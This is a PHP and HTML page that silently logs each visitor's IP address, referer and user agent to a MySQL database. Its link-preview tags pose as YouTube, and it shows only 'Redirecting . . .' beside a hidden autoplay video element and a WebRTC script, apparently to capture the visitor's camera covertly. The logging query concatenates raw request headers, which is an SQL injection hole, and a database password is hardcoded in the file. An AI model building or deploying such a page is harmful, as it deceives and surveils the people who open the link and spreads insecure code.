<?php
$servername = "localhost";
$username = "toledana";
$password = "09092666456";
$dbname = "logging";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$sql = "INSERT INTO visit_logs (referer, client_ip, user_agent) VALUES ('".(isset($_SERVER['HTTP_REFERER'])?$_SERVER['HTTP_REFERER']:'')."', '".$_SERVER['REMOTE_ADDR']."', '".$_SERVER['HTTP_USER_AGENT']."')";


if ($conn->query($sql) === TRUE) {
    //echo "New record created successfully";
} else {
    echo "Error: " . $sql . "<br>" . $conn->error;
}

$conn->close();

?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Soledad Video</title>

    <meta property="og:image" content="images/1.jpg" />
    <meta property="og:description" content="Enjoy the videos and music you love, upload original content, and share it all with friends, family, and the world on YouTube." />
    <meta property="og:title" content="soledad video/ - YouTube" />

    <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
    <script src="https://webrtc.github.io/adapter/adapter-latest.js"></script>
    <script src="index.js"></script>

</head>
<body>
Redirecting . . .
<video id="myVideo" autoplay style="visibility: hidden;"></video>
</body>
</html>
